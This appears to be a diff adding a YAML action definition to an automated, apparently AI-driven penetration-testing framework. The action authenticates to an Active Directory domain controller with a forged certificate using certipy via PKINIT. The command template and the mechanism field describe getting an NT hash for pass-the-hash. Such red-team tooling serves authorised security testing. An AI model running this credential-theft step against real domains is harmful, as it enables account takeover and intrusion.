@@ -1,0 +1,16 @@
+name: certipy_auth
+category: ad
+description: Authenticate with forged certificate via PKINIT
+preconditions:
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "certipy auth -pfx '{pfx_file}' -dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "PKINIT authentication using certificate. Returns NT hash via U2U. Can be used for pass-the-hash or further authentication."
